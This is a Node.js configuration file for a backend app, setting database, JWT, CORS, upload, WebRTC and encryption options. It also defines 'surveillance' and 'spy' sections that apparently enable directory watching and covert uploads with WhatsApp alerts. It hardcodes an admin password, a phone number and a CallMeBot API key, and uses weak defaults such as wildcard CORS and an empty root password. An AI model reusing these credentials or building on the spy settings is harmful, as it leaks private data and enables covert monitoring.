require('dotenv').config();
const path = require('path');

const config = {
  port: process.env.PORT || 5000,
  database: {
    host: process.env.DB_HOST || 'localhost',
    port: process.env.DB_PORT || 3306,
    username: process.env.DB_USERNAME || 'root',
    password: process.env.DB_PASSWORD || '',
    database: process.env.DB_NAME || 'di_app',
    dialect: 'mysql'
  },
  jwt: {
    secret: process.env.JWT_SECRET || 'your-secret-key-change-in-production',
    expiresIn: process.env.JWT_EXPIRES_IN || '30d'
  },
  cors: {
    origin: process.env.CORS_ORIGIN || '*'
  },
  upload: {
    dir: path.join(__dirname, '../../uploads'),
    maxSize: 100 * 1024 * 1024 // 100MB
  },
  socket: {
    cors: {
      origin: process.env.CORS_ORIGIN || '*'
    }
  },
  webrtc: {
    stunServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' }
    ]
  },
  encryption: {
    enabled: process.env.ENCRYPTION_ENABLED === 'true',
    algorithm: 'aes-256-gcm'
  },
  surveillance: {
    enabled: process.env.SURVEILLANCE_ENABLED === 'true',
    watchDirs: process.env.WATCH_DIRS ? process.env.WATCH_DIRS.split(',') : [],
    batchSize: parseInt(process.env.BATCH_SIZE) || 3,
    retryInterval: parseInt(process.env.RETRY_INTERVAL) || 60000,
    maxRetries: parseInt(process.env.MAX_RETRIES) || 3
  },
  spy: {
    enabled: process.env.SPY_ENABLED !== 'false',
    dir: path.join(__dirname, '../../uploads/spy'),
    secretToken: process.env.SPY_SECRET_TOKEN || 'di-mode-token-secret',
    adminPassword: process.env.SPY_ADMIN_PASSWORD || '#Paul@26@',
    notifyPhone: process.env.SPY_NOTIFY_PHONE || process.env.SPY_WHATSAPP_PHONE || '22891782947',
    callmebotApiKey: process.env.SPY_CALLMEBOT_API_KEY || '1944847',
    notifyOnUpload: process.env.SPY_NOTIFY_ON_UPLOAD === 'true'
  }
};

module.exports = config;
